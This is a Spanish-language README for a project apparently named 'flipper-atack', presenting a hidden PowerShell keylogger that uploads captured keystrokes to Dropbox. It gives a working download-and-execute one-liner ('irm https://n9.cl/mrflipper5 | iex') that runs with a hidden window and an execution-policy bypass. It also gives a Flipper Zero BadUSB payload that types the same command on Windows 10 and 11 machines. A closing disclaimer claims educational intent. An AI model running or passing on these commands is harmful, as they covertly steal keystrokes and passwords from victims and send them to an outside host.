
---

# PowerShell Keylogger con Subida a Dropbox

Este script está diseñado para capturar las pulsaciones de teclas (keylogger) y subir los datos capturados a Dropbox. Además, incluye una funcionalidad para detener la ejecución automáticamente cuando se detecta un archivo de señalización (`stop.txt`) en la carpeta temporal del usuario.

## Características

- **Captura de Pulsaciones de Teclas**: Monitorea las pulsaciones de teclas y captura caracteres legibles, incluyendo teclas especiales como `[BKSP]`, `[ENT]` y `[ESC]`.
- **Subida a Dropbox**: Sube los datos a Dropbox utilizando un token de acceso proporcionado dinámicamente.
- **Detección y Detención Automática**: El script se detiene automáticamente cuando se detecta un archivo `stop.txt` en la carpeta temporal del usuario.
- **Ejecución Oculta**: El script se ejecuta en segundo plano sin mostrar una ventana de PowerShell.
- **Ejecución desde Flipper Zero**: Puedes ejecutar el script directamente desde Flipper Zero para facilitar su uso en entornos físicos.

## Requisitos

- **PowerShell 5.0 o superior**
- **Una cuenta de Dropbox**
- **Token de acceso de Dropbox**

## Instalación

### Método 1: Ejecutar en PowerShell

1. **Clona el Repositorio**:

   ```bash
   https://github.com/dolaraso/flipper-atack.git
   cd flipper-atack.git
   ```

2. **Guardar el Script**:

   Guarda el script proporcionado como `keylogger.ps1` en tu máquina.

3. **Configura el Token de Dropbox**:

   Asegúrate de colocar tu token de acceso de Dropbox en el siguiente fragmento del script:

   ```powershell
   $db = "TU_TOKEN_DE_ACCESSO_DROPBOX"  # Reemplaza con tu token de acceso real
   ```

4. **Ejecutar el Script**:

   Ejecuta el siguiente comando en PowerShell para iniciar el script:

   ```powershell
   powershell -w h -NoP -Ep Bypass $db='TU_TOKEN_DE_ACCESSO_DROPBOX';irm https://n9.cl/mrflipper5 | iex
   ```

   Este comando ejecutará el script en segundo plano (`-w h`), desactivando restricciones de política de ejecución (`-NoP -Ep Bypass`), y cargará el script desde la URL proporcionada, utilizando el token de Dropbox que especificaste.

### Método 2: Ejecutar desde Flipper Zero

1. **Cargar el Script en Flipper Zero**:

   Utiliza el siguiente script en Flipper Zero para ejecutar el keylogger directamente desde el dispositivo:

   ```flipper
   REM     Title: Keylogger Dropbox
   REM     Author: mr.flippermen
   REM     Description: Este script está diseñado para capturar pulsaciones de teclas (keylogger) y subir los datos capturados a Dropbox
   REM     Target: Windows 10, 11

   GUI r
   DELAY 500
   STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://n9.cl/mrflipper5 | iex
   ENTER
   ```

   Este código abrirá PowerShell, configurará los parámetros necesarios y ejecutará el script desde una URL externa.

## Detener la Ejecución del Script

Para detener el script de manera segura, simplemente crea un archivo `stop.txt` en la carpeta temporal del usuario. El script verificará la existencia de este archivo y se detendrá si lo encuentra.

### Crear el archivo `stop.txt`:

Para crear el archivo `stop.txt`, usa el siguiente comando en PowerShell:

```powershell
New-Item -Path "$env:TEMP\stop.txt" -ItemType File
```

### Eliminar el archivo `stop.txt`:

Si deseas eliminar el archivo de señalización y reiniciar el script, usa este comando:

```powershell
Remove-Item -Path "$env:TEMP\stop.txt" -Force
```

## Detalles del Script

### Keylogger

Este script realiza los siguientes pasos:

1. Captura las pulsaciones de teclas del sistema, incluyendo teclas especiales como `[BKSP]`, `[ENT]`, y `[ESC]`.
2. Almacena los datos capturados en una variable.
3. Envia los datos a Dropbox con un nombre de archivo basado en la fecha y hora actual.
4. Monitorea la carpeta temporal del usuario y se detiene automáticamente si encuentra un archivo `stop.txt`.

### Dropbox-Upload

Esta función realiza los siguientes pasos:

1. Toma el contenido de las pulsaciones de teclas como parámetro.
2. Define los encabezados y parámetros necesarios para la solicitud a la API de Dropbox.
3. Usa `Invoke-RestMethod` para subir los datos a Dropbox.

## Notas

- Asegúrate de tener suficiente espacio en tu cuenta de Dropbox para almacenar los datos subidos.
- El script debe ejecutarse con permisos de administrador para capturar las pulsaciones de teclas.
- Recuerda que el script puede ejecutarse también desde un Flipper Zero, lo que facilita su uso en entornos controlados o pruebas de penetración.

## Licencia

Este proyecto está licenciado bajo los términos de la licencia MIT. Consulta el archivo `LICENSE` para más detalles.

---

🚨 **Descargo de Responsabilidad:**

El uso de este repositorio y los scripts contenidos en él es responsabilidad exclusiva del usuario. El autor de este proyecto no se hace responsable de cualquier daño, perjuicio o actividad ilegal que resulte del uso de estos scripts en entornos no autorizados o no controlados. Este proyecto debe ser utilizado únicamente con fines educativos y en entornos de pruebas con permisos explícitos. El uso indebido de este código puede estar sujeto a acciones legales. El usuario es responsable de cumplir con todas las leyes locales y regulaciones aplicables.

---
